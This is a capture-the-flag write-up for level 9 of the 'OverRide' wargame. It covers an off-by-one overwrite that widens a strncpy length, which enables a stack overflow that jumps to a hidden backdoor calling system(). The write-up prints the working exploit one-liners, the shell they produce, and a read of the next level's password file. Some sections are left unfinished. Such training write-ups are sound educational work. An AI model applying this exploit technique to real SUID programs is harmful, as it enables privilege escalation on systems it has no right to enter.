# Level 9

## Vulnerability

Off-by-one error

## Context

We find a binary with owner ```end``` and SUID.
```
level09@OverRide:~$ ls -l
-rwsr-s---+ 1 end users 12959 Oct  2  2016 level09
```

When run it prompts user for a username, and a message which is supposedly sent to *Unix-Dude*.
```
level09@OverRide:~$ ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: Drew
>: Welcome, Drew
>: Msg @Unix-Dude
>>: Dear Unix-Dude, lots of love, Drew
>: Msg sent!
level09@OverRide:~$
```

See [disassembly notes](https://github.com/anyashuka/Override/blob/main/level09/Ressources/disassembly_notes.md) for detailed gdb assembly breakdown.

## Solution

### Overview

The binary simply prompts for, then copies, username and a message.

Investigating with gdb we find a hidden function ```secret_backdoor()```, which reads to a buffer from stdin, then calls ```system()``` with the buffer. Obviously we would like to jump to ```secret_backdoor()``` somehow.

### Off-by-one error

The copy username loop has an off-by-one error, which allows the user to overwrite the ```len_message``` variable by one byte.

A larger ```len_message``` than the default 140 can cause strncpy to overflow the buffer when copying the *Msg*.

So let's fill the 40 byte username buffer then overflow by 1 byte into ```len_message```, writing the maximum 1 byte value ```0xff```.
```
level09@OverRide:~$ (python -c 'print "A" * 40 + "\xff"'; cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude

>>: >: Msg sent!

Segmentation fault (core dumped)
```
Great, its segfaults.

### Find offset

Can we overflow and overwrite EIP return address with the address of ```secret_backdoor()```?


### Build exploit

So we build our exploit:
1. username buffer until overflow - 
2.
3. 

```
level09@OverRide:~$ gdb -q level09
Reading symbols from /home/users/level09/level09...(no debugging symbols found)...done.
(gdb) quit
level09@OverRide:~$ (python -c 'print "A" * 40 + "\xd0" + "\n" + "A" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n" + "/bin/sh"'; cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
whoami
end
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```

### End

Let's log in to user ```end```.
```
level09@OverRide:~$ su end
Password: j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
end@OverRide:~$ ls
end
end@OverRide:~$ cat end
GG !
```
Good Game!
